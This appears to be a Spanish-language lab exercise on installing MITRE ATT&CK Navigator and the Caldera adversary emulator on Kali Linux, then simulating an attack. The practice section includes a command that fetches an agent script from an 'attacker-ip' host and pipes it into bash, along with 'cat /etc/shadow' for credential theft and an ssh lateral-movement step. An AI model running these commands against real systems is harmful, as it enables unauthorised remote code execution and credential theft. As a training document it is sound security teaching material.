![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Practica - Instalación de MITRE ATT&CK en Kali Linux**



MITRE ATT&CK se puede utilizar con herramientas en Kali Linux para emular ataques y analizar vulnerabilidades.

### **📌 Paso 1: Instalar ATT&CK Navigator**

ATT&CK Navigator permite visualizar y personalizar la matriz MITRE ATT&CK.

1. Clonar el repositorio de Navigator:

   ```bash
   git clone https://github.com/mitre-attack/attack-navigator.git
   ```

2. Instalar dependencias:

   ```bash
   cd attack-navigator/nav-app
   npm install
   ```

3. Iniciar el servidor de Navigator:

   ```bash
   npm run start
   ```

4. Acceder en el navegador:

   ```bash
   http://localhost:4200
   ```

------

### **📌 Paso 2: Instalar Caldera (Simulador de Adversarios)**

Caldera es una plataforma automatizada que emula ataques de MITRE ATT&CK.

1. Clonar el repositorio:

   ```bash
   git clone https://github.com/mitre/caldera.git --recursive
   ```

2. Instalar dependencias:

   ```bash
   cd caldera
   pip3 install -r requirements.txt
   ```

3. Iniciar el servidor:

   ```python
   python3 server.py --insecure
   ```

4. Acceder en el navegador:

   ```bash
   http://localhost:8888
   ```

   Usuario: 

   ```
   admin
   ```

   Contraseña: 

   ```
   admin
   ```

------

## **3. Práctica: Simulación de Ataques con Caldera y ATT&CK**

Vamos a realizar una **simulación de ataque** utilizando Caldera y analizarlo con ATT&CK Navigator.

### **Escenario**

Un atacante ha comprometido una máquina en la red y busca escalar privilegios y moverse lateralmente.

------

### **📌 Paso 1: Crear un Agente en la Máquina Objetivo**

1. En **Caldera**, navega a **"Agents" → "Add Agent"**.

2. Selecciona **Linux** como SO objetivo.

3. Copia el comando generado y ejecútalo en la máquina víctima:

   ```bash
   curl -s http://attacker-ip:8888/file/agent.sh | bash
   ```

   Esto establecerá una sesión de agente en la máquina objetivo.

------

### **📌 Paso 2: Ejecutar Tácticas de MITRE ATT&CK**

Desde Caldera, podemos ejecutar tácticas de la matriz ATT&CK:

1. Enumeración del sistema  ( Discovery Tactic - T1082 ):

   ```
   uname -a
   whoami
   id
   ```

2. Robo de Credenciales  ( Credential Access - T1003 ):

   ```bash
   cat /etc/shadow
   ```

3. Movimiento Lateral ( Lateral Movement - T1077 ):

   ```bash
   ssh usuario@victima-ip
   ```

------

### **📌 Paso 3: Analizar los Resultados con ATT&CK Navigator**

1. Exporta los registros de Caldera.
2. En **ATT&CK Navigator**, carga los datos y marca las técnicas utilizadas.
3. Analiza cómo las tácticas se alinean con los ataques reales documentados por MITRE.







![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)



